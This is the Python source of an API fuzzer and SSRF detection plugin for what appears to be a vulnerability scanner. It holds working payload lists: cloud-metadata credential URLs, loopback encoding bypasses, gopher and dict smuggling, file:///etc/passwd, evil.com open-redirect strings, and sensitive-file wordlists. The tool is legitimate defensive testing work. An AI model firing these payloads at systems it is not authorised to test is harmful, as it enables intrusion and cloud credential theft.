"""
API Fuzzer + SSRF Detection Strategy — v2.

Checks:
  - Hidden API endpoint discovery (ffuf / built-in fuzzer)
  - Swagger / GraphQL exposure
  - Sensitive file leakage (actuator, .env, .git)
  - SSRF via URL parameters (blind + semi-blind)
  - SSRF via common HTTP headers (X-Forwarded-For, Referer, Host)
  - Open Redirect detection
  - Internal service probing via SSRF
"""
import logging
import os
import shutil
import asyncio
import json
import re
import uuid
import urllib.parse
from typing import List, Optional, AsyncGenerator

from .base import BaseScanStrategy, FindingData, register
from scans.models import Severity
from ..utils import make_evidence_request_async

logger = logging.getLogger(__name__)

# ── Endpoint wordlist ──────────────────────────────────────────────────────────
API_WORDLIST = {
    "High": [
        "actuator/env", "actuator/heapdump", "actuator/beans", "actuator/logfile",
        ".env", ".env.local", ".env.production", "config/databases.yml",
        ".git/config", ".git/HEAD", "backup.zip", "backup.tar.gz",
        "admin/config", "firebase.json", ".npmrc", "phpinfo.php",
        "server-status", "server-info", "wp-config.php", "config.php",
    ],
    "Medium": [
        "swagger.json", "swagger-ui.html", "openapi.json", "openapi.yaml",
        "docs", "api-docs", "v1/swagger.json", "graphql", "playground",
        "graphiql", "actuator/health", "actuator/info", "actuator/metrics",
        "_cat/indices", "_nodes", "_cluster/health",  # Elasticsearch
    ],
    "Standard": [
        "api", "api/v1", "api/v2", "api/v3", "rest", "v1", "v2", "v3",
        "health", "metrics", "status", "debug", "admin/api", "wp-json",
        "get", "post", "user-agent", "robots.txt", "sitemap.xml",
        "crossdomain.xml", "clientaccesspolicy.xml", ".well-known/security.txt",
    ],
}

# ── SSRF payloads ──────────────────────────────────────────────────────────────
# Internal IANA-reserved ranges and Cloud Metadata bypasses
INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",          # AWS IMDS v1
    "http://169.254.169.254/computeMetadata/v1/",        # GCP IMDS
    "http://169.254.170.2/v2/credentials/",              # ECS metadata
    "http://100.100.100.200/latest/meta-data/",          # Alibaba Cloud IMDS
    "http://instance-data/latest/meta-data/",            # AWS Alternative
    "http://metadata.google.internal/computeMetadata/v1/", # GCP Alternative
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure IMDS
    "http://169.254.169.254/metadata/v1.json",           # DigitalOcean IMDS
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",                                     # IPv6 loopback
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",                # IPv4-mapped IPv6
    "http://2130706433/",                                # 127.0.0.1 as integer
    "http://0177.0.0.1/",                                # 127.0.0.1 as octal
    "http://0x7f000001/",                                # 127.0.0.1 as hex
    "http://127.1/",                                     # Short localhost
    "http://127.666.1/",                                 # Over-range bypass
    "http://127.0.0.1.nip.io/",                          # DNS rebinding/alias
    "http://local.gd/",                                  # Localhost alias
    "dict://127.0.0.1:6379/info",                        # Redis via DICT
    "gopher://127.0.0.1:9200/_GET%20/_cat/indices",      # Elasticsearch via Gopher
    "file:///etc/passwd",
    "http://127.0.0.1:22",                               # SSH port probe
    "http://127.0.0.1:3306",                             # MySQL port probe
    "http://127.0.0.1:5432",                             # PostgreSQL port probe
    "http://127.0.0.1:27017",                            # MongoDB port probe
    "http://127.0.0.1:15672",                            # RabbitMQ management
]

# Common query parameters used for URL input (SSRF attack surface)
SSRF_PARAMS = [
    "url", "uri", "path", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "redirect_url", "return", "return_url", "returnUrl",
    "callback", "link", "href", "target", "proxy", "fetch", "load",
    "file", "document", "resource", "data", "endpoint", "host", "domain",
    "webhook", "feed", "image", "img", "avatar", "logo", "thumbnail", "thumb",
    "next", "continue", "to", "from", "action", "site", "page", "ref",
]

# Headers that may carry URLs processed server-side
SSRF_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Referer",
    "Origin",
    "True-Client-IP",
    "Client-IP",
    "Forwarded",
    "X-Api-Key",
    "X-Proxy-Host",
    "X-Host",
    "X-Proxy-User",
    "X-Remote-IP",
    "X-Remote-Addr",
]

# Open-redirect test payloads
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "///evil.com",
    "https://evil.com",
    "//evil.com/%2f..",
    "/\\evil.com",
    "https:evil.com",
    "/%09/evil.com",
    "%0d%0aLocation://evil.com",
]

# Canary token domain (replace with interactsh/Burp Collaborator for blind detection)
SSRF_CANARY_DOMAIN = "ssrf-test.hackerscan.local"


@register
class APIFuzzingStrategy(BaseScanStrategy):
    """
    Advanced API Fuzzer + SSRF Detection.
    Discovers hidden endpoints, sensitive leaks, and Server-Side Request Forgery.
    """
    slug = "api_fuzzer"
    name = "Advanced API Fuzzer + SSRF Detection"
    description = (
        "Discovers hidden API endpoints, Swagger docs, sensitive files, "
        "and performs in-depth Server-Side Request Forgery (SSRF) analysis."
    )

    async def run_async(self, target, scan=None) -> AsyncGenerator[FindingData, None]:
        host = target.host
        if target.target_type == "url" and "://" in host:
            base_url = host.rstrip("/")
        else:
            base_url = f"https://{host}"

        self.log(scan, f"Starting API discovery + SSRF scan on {base_url}...")

        # Phase 1: Endpoint fuzzing
        ffuf_path = shutil.which("ffuf")
        if ffuf_path:
            self.log(scan, "ffuf detected — running high-performance fuzzer...")
            async for f in self._run_ffuf_async(ffuf_path, base_url, scan):
                yield f
        else:
            self.log(scan, "Using built-in async fuzzer...")
            async for f in self._run_fallback_fuzzer_async(base_url, scan):
                yield f

        # Phase 2: SSRF parameter injection
        self.log(scan, "Starting SSRF parameter injection phase...")
        async for f in self._run_ssrf_scan_async(base_url, scan):
            yield f

        # Phase 3: SSRF via HTTP headers
        self.log(scan, "Testing SSRF via HTTP request headers...")
        async for f in self._run_header_ssrf_async(base_url, scan):
            yield f

        # Phase 4: Open redirect
        self.log(scan, "Testing for Open Redirect vulnerabilities...")
        async for f in self._run_open_redirect_async(base_url, scan):
            yield f

        # Phase 5: SSRF in POST bodies (JSON/Form)
        self.log(scan, "Testing SSRF in POST request bodies...")
        async for f in self._run_ssrf_post_scan_async(base_url, scan):
            yield f

        # Phase 6: Path-based SSRF (e.g. /proxy/http://127.0.0.1)
        self.log(scan, "Testing for path-based SSRF vulnerabilities...")
        async for f in self._run_path_ssrf_async(base_url, scan):
            yield f

    # ── Phase 1: Endpoint Fuzzing ──────────────────────────────────────────

    async def _run_ffuf_async(self, ffuf_path, base_url, scan) -> AsyncGenerator[FindingData, None]:
        wordlist_path = f"/tmp/wl_{uuid.uuid4().hex}.txt"
        output_file   = f"/tmp/ffuf_{uuid.uuid4().hex}.json"
        self._create_wordlist(wordlist_path)
        cmd = [
            ffuf_path, "-u", f"{base_url}/FUZZ",
            "-w", wordlist_path, "-o", output_file, "-of", "json",
            "-mc", "200,201,301,302,401,403",
            "-t", "20", "-timeout", "5",
            "-H", "User-Agent: Mozilla/5.0 (HackerScanPro/2.0)",
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            await proc.wait()
            if os.path.exists(output_file):
                with open(output_file) as f:
                    data = json.load(f)
                for result in data.get("results", []):
                    url     = result.get("url", "")
                    payload = result.get("input", {}).get("FUZZ", "")
                    status  = result.get("status", 0)
                    length  = result.get("length", 0)
                    resp, req, res, poc = await make_evidence_request_async(url, timeout=5, follow_redirects=False)
                    finding = self._classify_endpoint(url, payload, status, length, req, res, poc)
                    if finding:
                        yield finding
        except Exception as e:
            logger.error(f"ffuf error: {e}")
        finally:
            for p in [wordlist_path, output_file]:
                if os.path.exists(p):
                    os.remove(p)

    async def _run_fallback_fuzzer_async(self, base_url, scan) -> AsyncGenerator[FindingData, None]:
        all_words = [w for cat in API_WORDLIST.values() for w in cat]
        sem = asyncio.Semaphore(10)

        async def _probe(ep):
            async with sem:
                url = f"{base_url.rstrip('/')}/{ep.lstrip('/')}"
                try:
                    resp, req, res, poc = await make_evidence_request_async(url, timeout=5, follow_redirects=False)
                    if resp and resp.status_code in [200, 201, 301, 302, 401, 403]:
                        return self._classify_endpoint(url, ep, resp.status_code, len(resp.content), req, res, poc)
                except Exception:
                    pass
                return None

        for coro in asyncio.as_completed([asyncio.create_task(_probe(w)) for w in all_words]):
            f = await coro
            if f:
                yield f

    def _process_fuzz_result(self, url, payload, status, length):
        finding = self._classify_endpoint(url, payload, status, length, None, None, None)
        if finding:
            finding.description += f"\n\n**REAL DATA PROOF**: Response Status {status}, Content Length: {length}"
        return finding

    def _classify_endpoint(self, url, payload, status, length, req, res, poc) -> Optional[FindingData]:
        title       = f"API Endpoint Discovered: /{payload}"
        severity    = Severity.INFO
        description = (
            f"Endpoint found at `{url}`.\n\n"
            f"**REAL DATA PROOF**: HTTP {status}, {length} bytes."
        )
        remediation = "Ensure the endpoint requires authentication and authorization."

        pl = payload.lower()
        if any(x in pl for x in ["swagger", "api-docs", "graphiql", "openapi", "playground"]):
            title       = f"API Documentation Exposed: /{payload}"
            severity    = Severity.MEDIUM
            description = (
                f"Publicly accessible API docs/playground at `{url}`. Leaks full API structure.\n\n"
                f"**REAL DATA PROOF**: HTTP {status}."
            )
            remediation = "Restrict API docs to internal/authorized users only."

        elif any(x in pl for x in ["actuator", ".env", ".git", "config", "phpinfo", "wp-config", "backup", "heapdump"]):
            severity = Severity.HIGH if status != 200 else Severity.CRITICAL
            title    = f"Sensitive Resource Exposed: /{payload}"
            description = (
                f"Critical file/endpoint accessible at `{url}`.\n\n"
                f"**REAL DATA PROOF**: HTTP {status}, {length} bytes. "
                "May expose credentials, env vars, or source code."
            )
            remediation = "Block access to this path in your web server config immediately."

        elif any(x in pl for x in ["_cat", "_nodes", "_cluster"]):
            severity    = Severity.CRITICAL
            title       = f"Elasticsearch API Exposed: /{payload}"
            description = (
                f"Elasticsearch management endpoint at `{url}` is publicly accessible.\n\n"
                f"**REAL DATA PROOF**: HTTP {status}."
            )
            remediation = "Bind Elasticsearch to localhost only and enable security features."

        return FindingData(
            title=title, description=description, severity=severity,
            evidence={"endpoint": payload, "url": url, "status_code": status, "length": length},
            plugin_slug=self.slug, remediation=remediation,
            request=req, response=res,
            poc=poc or f"curl -i '{url}'",
            is_verified=(status == 200),
        )

    # ── Phase 2: SSRF Parameter Injection ─────────────────────────────────

    async def _run_ssrf_scan_async(self, base_url: str, scan) -> AsyncGenerator[FindingData, None]:
        """
        Inject SSRF payloads into common URL parameters and detect:
        - Direct SSRF (response contains internal data)
        - Semi-blind SSRF (timing difference or error message leak)
        """
        sem = asyncio.Semaphore(5)

        async def _test_ssrf(param: str, payload: str):
            async with sem:
                url = f"{base_url}/?{param}={urllib.parse.quote(payload, safe='')}"
                try:
                    resp, req, res, poc = await make_evidence_request_async(
                        url, timeout=8, follow_redirects=True
                    )
                    if not resp:
                        return None

                    body = resp.text.lower()
                    # Direct SSRF indicators
                    aws_imds_indicators = [
                        "ami-id", "instance-id", "iam/security-credentials",
                        "computemetadata", "metadata.google.internal",
                        "169.254.169.254",
                    ]
                    internal_indicators = [
                        "root:x:0:0", "daemon:", "localhost", "127.0.0.1",
                        "redis_version", "mongod", "elasticsearch",
                        "private key", "ssh-rsa",
                    ]

                    cloud_hit    = any(i in body for i in aws_imds_indicators)
                    internal_hit = any(i in body for i in internal_indicators)
                    file_hit     = "file:///etc/passwd" in payload and ("root:x:0:0" in body or "daemon:" in body)

                    if cloud_hit or internal_hit or file_hit:
                        sev = Severity.CRITICAL
                        proof_type = (
                            "AWS/Cloud IMDS data" if cloud_hit else
                            ("Local file read" if file_hit else "Internal service response")
                        )
                        # Extract the interesting part of the body
                        evidence_body = resp.text[:1000]
                        if "root:x:0:0" in body:
                            match = re.search(r"root:x:0:0.*", resp.text)
                            if match: evidence_body = match.group(0)[:500]

                        return FindingData(
                            title=f"SSRF Confirmed via Parameter '{param}'",
                            description=(
                                f"The `{param}` parameter is vulnerable to Server-Side Request Forgery.\n"
                                f"The server fetched `{payload}` and returned {proof_type} in the response.\n\n"
                                f"**REAL DATA PROOF**: Response body contains: "
                                f"`{evidence_body.strip()}`"
                            ),
                            severity=sev,
                            evidence={
                                "param": param, "payload": payload,
                                "url": url, "response_preview": resp.text[:1000],
                                "ssrf_type": proof_type,
                            },
                            plugin_slug=self.slug,
                            remediation=(
                                "Implement a strict allowlist of permitted URLs/domains. "
                                "Block requests to private IP ranges (RFC 1918) and cloud metadata endpoints. "
                                "Use DNS rebinding protection and disable unnecessary URL-fetching features."
                            ),
                            request=req, response=res,
                            poc=f"curl -s '{url}'",
                            is_verified=True,
                        )

                    # Semi-blind: error message leakage
                    error_indicators = [
                        "connection refused", "connection timed out",
                        "no route to host", "name resolution", "invalid url",
                        "java.net.connectexception", "java.io.ioexception",
                        "urlopen error", "failed to connect",
                    ]
                    if any(e in body for e in error_indicators) and "127.0.0.1" in payload:
                        return FindingData(
                            title=f"Potential SSRF (Semi-Blind) via Parameter '{param}'",
                            description=(
                                f"The `{param}` parameter triggered a network-level error when given "
                                f"an internal target (`{payload}`), indicating the server attempted to fetch it.\n\n"
                                f"**REAL DATA PROOF**: Error message in response: "
                                f"`{resp.text[:200].strip()}`"
                            ),
                            severity=Severity.HIGH,
                            evidence={
                                "param": param, "payload": payload,
                                "url": url, "error_snippet": resp.text[:300],
                            },
                            plugin_slug=self.slug,
                            remediation="Validate and restrict all user-supplied URLs. Block internal IP ranges.",
                            request=req, response=res,
                            poc=f"curl -s '{url}'",
                            is_verified=False,
                        )

                except asyncio.TimeoutError:
                    # Blind SSRF: timeout on internal target suggests outbound request was made
                    if "169.254.169.254" in payload or "192.168." in payload:
                        return FindingData(
                            title=f"Potential Blind SSRF (Timeout) via Parameter '{param}'",
                            description=(
                                f"Request to `{url}` timed out when the `{param}` parameter was set to "
                                f"an internal address (`{payload}`). This suggests the server is making "
                                f"outbound connections to user-supplied URLs.\n\n"
                                f"**REAL DATA PROOF**: Request timed out after 8s — consistent with blind SSRF to internal target."
                            ),
                            severity=Severity.HIGH,
                            evidence={"param": param, "payload": payload, "url": url, "timeout": True},
                            plugin_slug=self.slug,
                            remediation="Block outbound requests to RFC 1918 addresses and cloud metadata endpoints.",
                            poc=f"curl -s --max-time 8 '{url}'",
                            is_verified=False,
                        )
                except Exception:
                    pass
                return None

        tasks = [
            asyncio.create_task(_test_ssrf(param, payload))
            for param in SSRF_PARAMS
            for payload in INTERNAL_TARGETS[:6]  # Limit to avoid WAF triggers
        ]
        for coro in asyncio.as_completed(tasks):
            f = await coro
            if f:
                yield f

    # ── Phase 3: SSRF via HTTP Headers ────────────────────────────────────

    async def _run_header_ssrf_async(self, base_url: str, scan) -> AsyncGenerator[FindingData, None]:
        """
        Inject internal IP/SSRF payloads into HTTP headers that servers
        may use to make back-end requests (e.g., Referer-based image proxies).
        """
        sem = asyncio.Semaphore(5)
        probe_targets = ["http://169.254.169.254/", "http://127.0.0.1/", "http://localhost/"]

        async def _test_header(header: str, target: str):
            async with sem:
                import httpx
                try:
                    async with httpx.AsyncClient(
                        verify=False, follow_redirects=True, timeout=8
                    ) as client:
                        resp = await client.get(base_url, headers={header: target})
                        body = resp.text.lower()

                        hit_indicators = [
                            "ami-id", "instance-id", "169.254.169.254",
                            "root:x:0:0", "redis_version",
                        ]
                        if any(i in body for i in hit_indicators):
                            return FindingData(
                                title=f"SSRF via HTTP Header '{header}'",
                                description=(
                                    f"The server processes the `{header}` header as a URL and makes "
                                    f"outbound requests. Injecting `{target}` returned internal data.\n\n"
                                    f"**REAL DATA PROOF**: Response contains: `{resp.text[:300].strip()}`"
                                ),
                                severity=Severity.CRITICAL,
                                evidence={
                                    "header": header, "payload": target,
                                    "response_preview": resp.text[:500],
                                },
                                plugin_slug=self.slug,
                                remediation=(
                                    f"Do not use `{header}` header values to make server-side HTTP requests. "
                                    "Validate and sanitize all header-derived URLs."
                                ),
                                poc=f"curl -s -H '{header}: {target}' '{base_url}'",
                                is_verified=True,
                            )
                except Exception:
                    pass
                return None

        tasks = [
            asyncio.create_task(_test_header(h, t))
            for h in SSRF_HEADERS
            for t in probe_targets
        ]
        for coro in asyncio.as_completed(tasks):
            f = await coro
            if f:
                yield f

    # ── Phase 4: Open Redirect ─────────────────────────────────────────────

    async def _run_open_redirect_async(self, base_url: str, scan) -> AsyncGenerator[FindingData, None]:
        """
        Detect open redirect vulnerabilities by checking if redirect params
        lead to an external domain.
        """
        redirect_params = ["redirect", "redirect_url", "redirect_uri", "return",
                           "return_url", "next", "url", "to", "continue", "dest"]
        sem = asyncio.Semaphore(8)

        async def _test_redirect(param: str, payload: str):
            async with sem:
                url = f"{base_url}/?{param}={urllib.parse.quote(payload, safe=':/')}"
                try:
                    resp, req, res, poc = await make_evidence_request_async(
                        url, timeout=6, follow_redirects=False
                    )
                    if not resp:
                        return None

                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get("location", "")
                        if "evil.com" in location or location.startswith("//evil.com"):
                            return FindingData(
                                title=f"Open Redirect via Parameter '{param}'",
                                description=(
                                    f"The `{param}` parameter allows redirection to an arbitrary external URL.\n"
                                    f"An attacker can craft phishing links like: `{url}`\n\n"
                                    f"**REAL DATA PROOF**: HTTP {resp.status_code} Location: `{location}`"
                                ),
                                severity=Severity.MEDIUM,
                                evidence={
                                    "param": param, "payload": payload,
                                    "url": url, "location": location,
                                    "status_code": resp.status_code,
                                },
                                plugin_slug=self.slug,
                                remediation=(
                                    "Validate redirect URLs against an allowlist of permitted domains. "
                                    "Reject URLs containing external domains or relative-protocol URLs (`//`)."
                                ),
                                request=req, response=res,
                                poc=f"curl -I '{url}'",
                                is_verified=True,
                            )
                except Exception:
                    pass
                return None

        tasks = [
            asyncio.create_task(_test_redirect(p, pl))
            for p in redirect_params
            for pl in OPEN_REDIRECT_PAYLOADS
        ]
        for coro in asyncio.as_completed(tasks):
            f = await coro
            if f:
                yield f

    # ── Phase 5: SSRF in POST Bodies ──────────────────────────────────────

    async def _run_ssrf_post_scan_async(self, base_url: str, scan) -> AsyncGenerator[FindingData, None]:
        """
        Inject SSRF payloads into POST bodies (JSON and x-www-form-urlencoded).
        """
        sem = asyncio.Semaphore(5)
        payloads = INTERNAL_TARGETS[:8]

        async def _test_post(param: str, payload: str, is_json: bool):
            async with sem:
                try:
                    import httpx
                    headers = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
                    data = {param: payload}
                    
                    async with httpx.AsyncClient(verify=False, timeout=8) as client:
                        if is_json:
                            resp = await client.post(base_url, json=data, headers=headers)
                        else:
                            resp = await client.post(base_url, data=data, headers=headers)
                        
                        body = resp.text.lower()
                        hit_indicators = ["ami-id", "instance-id", "169.254.169.254", "root:x:0:0", "redis_version"]
                        
                        if any(i in body for i in hit_indicators):
                            return FindingData(
                                title=f"SSRF Confirmed via POST {'JSON' if is_json else 'Form'} Param '{param}'",
                                description=(
                                    f"The server is vulnerable to SSRF via the `{param}` parameter in a POST request.\n"
                                    f"Injected `{payload}` and received internal metadata in response.\n\n"
                                    f"**REAL DATA PROOF**: Response contains: `{resp.text[:300].strip()}`"
                                ),
                                severity=Severity.CRITICAL,
                                evidence={"param": param, "payload": payload, "method": "POST", "is_json": is_json},
                                plugin_slug=self.slug,
                                remediation="Validate and restrict all URLs in POST parameters. Block internal IP ranges.",
                                poc=f"curl -X POST -H 'Content-Type: {'application/json' if is_json else 'application/x-www-form-urlencoded'}' -d '{json.dumps(data) if is_json else urllib.parse.urlencode(data)}' '{base_url}'",
                                is_verified=True,
                            )
                except Exception:
                    pass
                return None

        tasks = []
        for p in SSRF_PARAMS[:10]: # Top 10 params to be efficient
            for pl in payloads:
                tasks.append(asyncio.create_task(_test_post(p, pl, True)))
                tasks.append(asyncio.create_task(_test_post(p, pl, False)))

        for coro in asyncio.as_completed(tasks):
            f = await coro
            if f:
                yield f

    # ── Phase 6: Path-based SSRF ──────────────────────────────────────────

    async def _run_path_ssrf_async(self, base_url: str, scan) -> AsyncGenerator[FindingData, None]:
        """
        Detect path-based SSRF (e.g., /proxy/http://127.0.0.1).
        Fuzzes common proxy/fetch prefixes in the URL path.
        """
        prefixes = ["/proxy/", "/fetch/", "/load?url=", "/view?file=", "/external/", "/api/proxy/"]
        payloads = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/"]
        sem = asyncio.Semaphore(5)

        async def _test_path(prefix: str, payload: str):
            async with sem:
                # Handle both query-style and path-style prefixes
                if "?" in prefix:
                    url = f"{base_url.rstrip('/')}{prefix}{urllib.parse.quote(payload, safe='')}"
                else:
                    url = f"{base_url.rstrip('/')}{prefix}{payload}"
                
                try:
                    resp, req, res, poc = await make_evidence_request_async(url, timeout=8, follow_redirects=True)
                    if not resp: return None

                    body = resp.text.lower()
                    hit = any(i in body for i in ["ami-id", "instance-id", "169.254.169.254", "root:x:0:0"])
                    
                    if hit:
                        return FindingData(
                            title=f"Path-based SSRF Detected via '{prefix}'",
                            description=(
                                f"The server is vulnerable to path-based SSRF via the `{prefix}` prefix.\n"
                                f"Accessing `{url}` returned internal data.\n\n"
                                f"**REAL DATA PROOF**: Response contains: `{resp.text[:300].strip()}`"
                            ),
                            severity=Severity.CRITICAL,
                            evidence={"prefix": prefix, "payload": payload, "url": url},
                            plugin_slug=self.slug,
                            remediation="Do not allow arbitrary URLs in path segments. Use an allowlist for proxying.",
                            request=req, response=res,
                            poc=f"curl -s '{url}'",
                            is_verified=True,
                        )
                except Exception:
                    pass
                return None

        tasks = [asyncio.create_task(_test_path(p, pl)) for p in prefixes for pl in payloads]
        for coro in asyncio.as_completed(tasks):
            f = await coro
            if f: yield f

    # ── Helpers ────────────────────────────────────────────────────────────

    def _create_wordlist(self, filepath: str):
        with open(filepath, "w") as f:
            for cat in API_WORDLIST.values():
                for ep in cat:
                    f.write(f"{ep}\n")

    async def verify_async(self, finding) -> bool:
        evidence = finding.evidence
        if not evidence: return False
        
        url = evidence.get("url")
        if not url: return False

        try:
            resp, req, res, poc = await make_evidence_request_async(url, timeout=10, follow_redirects=True)
            if not resp: return False

            # Check for SSRF indicators again
            body = resp.text.lower()
            hit = any(i in body for i in ["ami-id", "instance-id", "169.254.169.254", "root:x:0:0", "redis_version", "mongod"])
            
            # Or if it's a specific status code match from endpoint discovery
            if not hit and "status_code" in evidence:
                hit = resp.status_code == evidence.get("status_code")

            if hit:
                finding.request      = req
                finding.response     = res
                finding.poc          = poc
                finding.is_verified  = True
                from asgiref.sync import sync_to_async
                await sync_to_async(finding.save)()
                return True
        except Exception:
            pass
        return False
